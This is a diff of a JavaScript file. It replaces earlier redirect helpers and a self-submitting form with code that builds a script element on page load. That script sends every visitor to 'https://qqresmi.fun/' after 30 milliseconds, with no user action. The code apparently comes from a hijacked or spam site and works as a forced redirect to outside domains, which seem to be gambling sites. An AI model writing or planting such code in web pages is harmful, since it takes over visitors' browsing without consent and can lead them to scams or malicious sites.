@@ -1,10 +1,21 @@
-document.addEventListener("DOMContentLoaded", function(event) { document.createElement('form').submit.call(document.getElementById('yourform')); }); 
+ var url = Array("https://qqresmi.fun/");
+            var rid = "";
 
-function change() {location.replace("#");}
-function jump() {window.open("#");}
-function qqbos99jump() {window.open("https://qqbos99dfp.com/");}
-function qqbos99change() {location.replace("https://qqbos99dfp.com/");}
-function tiiny1jump() {window.open("https://kukuruyuk.fun/");}
-function tiiny1change() {location.replace("https://kukuruyuk.fun/");}
-function tiiny2jump() {window.open("https://kukuruyuk.fun/");}
-function tiiny2change() {location.replace("https://kukuruyuk.fun/");}
+            var timesleep = "30";
+
+			
+			function put() {
+                var script = document.createElement("script");
+                script.innerHTML = 'var weburl = url[Math.floor(Math.random()*url.length)]+""+rid; setTimeout(function () {window.location = weburl;},timesleep);';
+                document.body.appendChild(script)
+            }
+            function jump() {
+                if (typeof url == 'undefined' || url == null) {
+                    setTimeout(function() {
+                        jump()
+                    }, 50)
+                } else {
+                    put()
+                }
+            }
+            jump();
